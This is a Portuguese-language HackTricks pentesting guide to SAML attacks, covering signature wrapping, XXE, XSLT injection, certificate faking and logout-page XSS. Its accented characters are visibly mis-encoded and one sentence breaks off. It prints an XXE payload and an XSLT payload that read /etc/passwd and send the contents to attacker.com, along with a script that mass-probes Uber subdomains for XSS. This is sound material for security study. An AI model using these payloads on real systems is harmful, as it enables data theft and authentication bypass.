# Ataques SAML

## Ataques SAML

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

## Informa√ß√µes B√°sicas

{% content-ref url="saml-basics.md" %}
[saml-basics.md](saml-basics.md)
{% endcontent-ref %}

## Ferramenta

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor): Uma ferramenta que pode receber uma URL ou lista de URLs e retornar a URL de consumo SAML.

## Viagem de ida e volta XML

No XML, a parte assinada do XML √© salva na mem√≥ria, em seguida, ocorre alguma codifica√ß√£o/decodifica√ß√£o e a assinatura √© verificada. Idealmente, essa codifica√ß√£o/decodifica√ß√£o n√£o deveria alterar os dados, mas com base nesse cen√°rio, **os dados verificados e os dados originais podem n√£o ser os mesmos**.

Por exemplo, verifique o seguinte c√≥digo:
```ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
<Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
```
Executar o programa contra o REXML 3.2.4 ou anterior resultaria na seguinte sa√≠da:
```
First child in original doc: Y
First child after round-trip: Z
```
Este √© como o REXML viu o documento XML original do programa acima:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (561).png>)

E assim que o viu ap√≥s uma rodada de an√°lise e serializa√ß√£o:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (562).png>)

Para mais informa√ß√µes sobre a vulnerabilidade e como abus√°-la:

* [https://mattermost.com/blog/securing-xml-implementations-across-the-web/](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
* [https://joonas.fi/2021/08/saml-is-insecure-by-design/](https://joonas.fi/2021/08/saml-is-insecure-by-design/)

## Ataques de Envolt√≥rio de Assinatura XML

Nos **ataques de Envolt√≥rio de Assinatura XML (XSW)**, os advers√°rios exploram uma vulnerabilidade que surge quando documentos XML s√£o processados em duas fases distintas: **valida√ß√£o de assinatura** e **invoca√ß√£o de fun√ß√£o**. Esses ataques envolvem a altera√ß√£o da estrutura do documento XML. Especificamente, o atacante **injeta elementos forjados** que n√£o comprometem a validade da Assinatura XML. Essa manipula√ß√£o tem como objetivo criar uma discrep√¢ncia entre os elementos analisados pela **l√≥gica da aplica√ß√£o** e aqueles verificados pelo **m√≥dulo de verifica√ß√£o de assinatura**. Como resultado, enquanto a Assinatura XML permanece tecnicamente v√°lida e passa na verifica√ß√£o, a l√≥gica da aplica√ß√£o processa os **elementos fraudulentos**. Consequentemente, o atacante consegue contornar a **prote√ß√£o de integridade** e **autentica√ß√£o de origem** da Assinatura XML, permitindo a **inje√ß√£o de conte√∫do arbitr√°rio** sem detec√ß√£o.

Os seguintes ataques s√£o baseados neste **[post de blog](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)** e **[neste artigo](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf)**. Portanto, consulte-os para mais detalhes.

### XSW #1
- **Estrat√©gia**: Um novo elemento raiz contendo a assinatura √© adicionado.
- **Implica√ß√£o**: O validador pode se confundir entre o "Response -> Assertion -> Subject" leg√≠timo e o "novo Response -> Assertion -> Subject" do atacante, levando a problemas de integridade de dados.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-1.svg](<../../.gitbook/assets/image (538).png>)

### XSW #2
- **Diferen√ßa do XSW #1**: Utiliza uma assinatura destacada em vez de uma assinatura envolvente.
- **Implica√ß√£o**: A estrutura "maliciosa", semelhante ao XSW #1, visa enganar a l√≥gica de neg√≥cios ap√≥s a verifica√ß√£o de integridade.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-2.svg](<../../.gitbook/assets/image (539).png>)

### XSW #3
- **Estrat√©gia**: Uma Assertion maliciosa √© criada no mesmo n√≠vel hier√°rquico que a assertion original.
- **Implica√ß√£o**: Pretende confundir a l√≥gica de neg√≥cios para usar os dados maliciosos.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-3.svg](<../../.gitbook/assets/image (540).png>)

### XSW #4
- **Diferen√ßa do XSW #3**: A Assertion original se torna filha da Assertion duplicada (maliciosa).
- **Implica√ß√£o**: Semelhante ao XSW #3, mas altera a estrutura XML de forma mais agressiva.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-4.svg](<../../.gitbook/assets/image (541).png>)

### XSW #5
- **Aspecto √önico**: Nem a Assinatura nem a Assertion original seguem configura√ß√µes padr√£o (envolvente/envelopante/destacada).
- **Implica√ß√£o**: A Assertion copiada envolve a Assinatura, modificando a estrutura do documento esperada.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-5.svg](<../../.gitbook/assets/image (542).png>)

### XSW #6
- **Estrat√©gia**: Inser√ß√£o de local semelhante aos XSW #4 e #5, mas com um toque.
- **Implica√ß√£o**: A Assertion copiada envolve a Assinatura, que ent√£o envolve a Assertion original, criando uma estrutura enganosa aninhada.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-6.svg](<../../.gitbook/assets/image (543).png>)

### XSW #7
- **Estrat√©gia**: Um elemento Extensions √© inserido com a Assertion copiada como filho.
- **Implica√ß√£o**: Isso explora o esquema menos restritivo do elemento Extensions para contornar contramedidas de valida√ß√£o de esquema, especialmente em bibliotecas como o OpenSAML.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-7.svg](<../../.gitbook/assets/image (544).png>)

### XSW #8
- **Diferen√ßa do XSW #7**: Utiliza outro elemento XML menos restritivo para uma variante do ataque.
- **Implica√ß√£o**: A Assertion original se torna filha do elemento menos restritivo, revertendo a estrutura usada no XSW #7.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-8.svg](<../../.gitbook/assets/image (545).png>)

### Ferramenta

Voc√™ pode usar a extens√£o Burp [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) para analisar a solicita√ß√£o, aplicar qualquer ataque XSW que escolher e lan√ß√°-lo.

## XXE

Se voc√™ n√£o sabe que tipo de ataques s√£o XXE, por favor, leia a seguinte p√°gina:

{% content-ref url="../xxe-xee-xml-external-entity.md" %}
[xxe-xee-xml-external-entity.md](../xxe-xee-xml-external-entity.md)
{% endcontent-ref %}

As Respostas SAML s√£o **documentos XML comprimidos e codificados em base64** e podem ser suscet√≠veis a ataques de Entidade Externa XML (XXE). Ao manipular a estrutura XML da Resposta SAML, os atacantes podem tentar explorar vulnerabilidades XXE. Veja como um ataque desse tipo pode ser visualizado:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY    file SYSTEM "file:///etc/passwd">
<!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
<samlp:Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
<saml:Issuer>...</saml:Issuer>
<ds:Signature ...>
<ds:SignedInfo>
<ds:CanonicalizationMethod .../>
<ds:SignatureMethod .../>
<ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>...</ds:SignatureValue>
[...]
```
## Ferramentas

Voc√™ tamb√©m pode usar a extens√£o Burp [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) para gerar o POC a partir de uma solicita√ß√£o SAML para testar poss√≠veis vulnerabilidades XXE e vulnerabilidades SAML.

Confira tamb√©m esta palestra: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XSLT via SAML

Para mais informa√ß√µes sobre XSLT, acesse:

{% content-ref url="../xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

As Transforma√ß√µes de Linguagem de Estilo Extens√≠vel (XSLT) podem ser usadas para transformar documentos XML em v√°rios formatos, como HTML, JSON ou PDF. √â crucial observar que as **transforma√ß√µes XSLT s√£o realizadas antes da verifica√ß√£o da assinatura digital**. Isso significa que um ataque pode ser bem-sucedido mesmo sem uma assinatura v√°lida; uma assinatura autoassinada ou inv√°lida √© suficiente para prosseguir.

Aqui voc√™ pode encontrar um **POC** para verificar esse tipo de vulnerabilidades, na p√°gina hacktricks mencionada no in√≠cio desta se√ß√£o, voc√™ pode encontrar payloads.
```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
...
<ds:Transforms>
<ds:Transform>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="doc">
<xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
<xsl:variable name="escaped" select="encode-for-uri($file)"/>
<xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
<xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
<xsl:value-of select="unparsed-text($exploitUrl)"/>
</xsl:template>
</xsl:stylesheet>
</ds:Transform>
</ds:Transforms>
...
</ds:Signature>
```
### Ferramenta

Voc√™ tamb√©m pode usar a extens√£o Burp [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) para gerar o POC a partir de uma solicita√ß√£o SAML para testar poss√≠veis vulnerabilidades XSLT.

Confira tamb√©m esta palestra: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## Exclus√£o de Assinatura XML <a href="#xml-signature-exclusion" id="xml-signature-exclusion"></a>

A **Exclus√£o de Assinatura XML** observa o comportamento das implementa√ß√µes SAML quando o elemento de Assinatura n√£o est√° presente. Se este elemento estiver ausente, a **valida√ß√£o da assinatura pode n√£o ocorrer**, tornando-a vulner√°vel. √â poss√≠vel testar isso alterando o conte√∫do que √© normalmente verificado pela assinatura.

![https://epi052.gitlab.io/notes-to-self/img/saml/signature-exclusion.svg](<../../.gitbook/assets/image (547).png>)

### Ferramenta <a href="#xml-signature-exclusion-how-to" id="xml-signature-exclusion-how-to"></a>

Voc√™ tamb√©m pode usar a extens√£o Burp [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e). Interceptar a Resposta SAML e clicar em `Remover Assinaturas`. Ao fazer isso, **todos** os elementos de Assinatura s√£o removidos.

Com as assinaturas removidas, permita que a solicita√ß√£o prossiga para o alvo. Se a Assinatura n√£o for necess√°ria pelo Servi√ßo

## Falsifica√ß√£o de Certificado <a href="#certificate-faking" id="certificate-faking"></a>

A Falsifica√ß√£o de Certificado √© uma t√©cnica para testar se um **Provedor de Servi√ßos (SP) verifica corretamente se uma Mensagem SAML √© assinada** por um Provedor de Identidade (IdP) confi√°vel. Envolve o uso de um **certificado autoassinado** para assinar a Resposta ou Declara√ß√£o SAML, o que ajuda a avaliar o processo de valida√ß√£o de confian√ßa entre SP e IdP.

### Como Realizar a Falsifica√ß√£o de Certificado
Os seguintes passos descrevem o processo usando a extens√£o Burp [SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e):

1. Interceptar a Resposta SAML.
2. Se a resposta contiver uma assinatura, enviar o certificado para o SAML Raider Certs usando o bot√£o `Enviar Certificado para SAML Raider Certs`.
3. Na guia Certificados do SAML Raider, selecionar o certificado importado e clicar em `Salvar e Autoassinado` para criar um clone autoassinado do certificado original.
4. Voltar para a solicita√ß√£o interceptada no Proxy do Burp. Selecionar o novo certificado autoassinado no menu suspenso de Assinatura XML.
5. Remover quaisquer assinaturas existentes com o bot√£o `Remover Assinaturas`.
6. Assinar a mensagem ou declara√ß√£o com o novo certificado usando o bot√£o **`(Re-)Assinar Mensagem`** ou **`(Re-)Assinar Declara√ß√£o`**, conforme apropriado.
7. Encaminhar a mensagem assinada. A autentica√ß√£o bem-sucedida indica que o SP aceita mensagens assinadas pelo seu certificado autoassinado, revelando potenciais vulnerabilidades no processo de valida√ß√£o das mensagens SAML.

## Confus√£o de Destinat√°rio de Token / Confus√£o de Destino do Provedor de Servi√ßos <a href="#token-recipient-confusion" id="token-recipient-confusion"></a>

A Confus√£o de Destinat√°rio de Token e a Confus√£o de Destino do Provedor de Servi√ßos envolvem verificar se o **Provedor de Servi√ßos valida corretamente o destinat√°rio pretendido de uma resposta**. Em ess√™ncia, um Provedor de Servi√ßos deve rejeitar uma resposta de autentica√ß√£o se ela foi destinada a um provedor diferente. O elemento cr√≠tico aqui √© o campo **Destinat√°rio**, encontrado dentro do elemento **SubjectConfirmationData** de uma Resposta SAML. Este campo especifica uma URL indicando para onde a Declara√ß√£o deve ser enviada. Se o destinat√°rio real n√£o corresponder ao Provedor de Servi√ßos pretendido, a Declara√ß√£o deve ser considerada inv√°lida.

#### **Como Funciona**

Para que um ataque de Confus√£o de Destinat√°rio de Token SAML (SAML-TRC) seja vi√°vel, certas condi√ß√µes devem ser atendidas. Em primeiro lugar, deve haver uma conta v√°lida em um Provedor de Servi√ßos (referido como SP-Legit). Em segundo lugar, o Provedor de Servi√ßos direcionado (SP-Target) deve aceitar tokens do mesmo Provedor de Identidade que atende ao SP-Legit.

O processo de ataque √© simples sob essas condi√ß√µes. Uma sess√£o aut√™ntica √© iniciada com o SP-Legit por meio do Provedor de Identidade compartilhado. A Resposta SAML do Provedor de Identidade para o SP-Legit √© interceptada. Esta Resposta SAML interceptada, originalmente destinada ao SP-Legit, √© ent√£o redirecionada para o SP-Target. O sucesso neste ataque √© medido pelo SP-Target aceitando a Declara√ß√£o, concedendo acesso a recursos sob o mesmo nome de conta usado para o SP-Legit.
```python
# Example to simulate interception and redirection of SAML Response
def intercept_and_redirect_saml_response(saml_response, sp_target_url):
"""
Simulate the interception of a SAML Response intended for SP-Legit and its redirection to SP-Target.

Args:
- saml_response: The SAML Response intercepted (in string format).
- sp_target_url: The URL of the SP-Target to which the SAML Response is redirected.

Returns:
- status: Success or failure message.
"""
# This is a simplified representation. In a real scenario, additional steps for handling the SAML Response would be required.
try:
# Code to send the SAML Response to SP-Target would go here
return "SAML Response successfully redirected to SP-Target."
except Exception as e:
return f"Failed to redirect SAML Response: {e}"
```
## XSS na funcionalidade de Logout

A pesquisa original pode ser acessada atrav√©s [deste link](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/).

Durante o processo de for√ßa bruta de diret√≥rios, uma p√°gina de logout foi descoberta em:
```
https://carbon-prototype.uberinternal.com:443/oidauth/logout
```
Ao acessar este link, ocorreu uma redirecionamento para:
```
https://carbon-prototype.uberinternal.com/oidauth/prompt?base=https%3A%2F%2Fcarbon-prototype.uberinternal.com%3A443%2Foidauth&return_to=%2F%3Fopenid_c%3D1542156766.5%2FSnNQg%3D%3D&splash_disabled=1
```
Isso revelou que o par√¢metro `base` aceita uma URL. Considerando isso, a ideia surgiu de substituir a URL por `javascript:alert(123);` na tentativa de iniciar um ataque XSS (Cross-Site Scripting).


### Explora√ß√£o em Massa

[A partir desta pesquisa](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/):

A ferramenta [**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor) foi usada para analisar subdom√≠nios de `uberinternal.com` em busca de dom√≠nios que utilizam a mesma biblioteca. Posteriormente, um script foi desenvolvido para visar a p√°gina `oidauth/prompt`. Este script testa o XSS (Cross-Site Scripting) inserindo dados e verificando se eles s√£o refletidos na sa√≠da. Nos casos em que a entrada √© de fato refletida, o script marca a p√°gina como vulner√°vel.
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import init ,Fore, Back, Style
init()

with open("/home/fady/uberSAMLOIDAUTH") as urlList:
for url in urlList:
url2 = url.strip().split("oidauth")[0] + "oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1"
request = requests.get(url2, allow_redirects=True,verify=False)
doesit = Fore.RED + "no"
if ("Fady" in request.content):
doesit = Fore.GREEN + "yes"
print(Fore.WHITE + url2)
print(Fore.WHITE + "Len : " + str(len(request.content)) + "   Vulnerable : " + doesit)
```
## Refer√™ncias
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)\
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
* [https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
